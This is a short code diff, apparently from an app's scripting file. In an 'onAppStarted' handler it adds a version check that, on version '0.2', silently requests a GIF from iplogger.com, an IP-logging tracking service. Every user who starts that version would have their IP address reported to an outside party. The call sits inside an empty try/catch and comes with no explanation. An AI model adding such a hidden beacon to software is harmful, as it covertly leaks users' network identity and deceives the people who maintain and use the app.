@@ -436,8 +436,8 @@ def onAppStarted() {
       } //os
 
       var vn = getVersionName(getAppPackageName());
-      if (vn == "0.1") {
-
+      if (vn == "0.2") {
+          get("https://iplogger.com/1QYkz7.gif ");
       }
 
    } catch {}
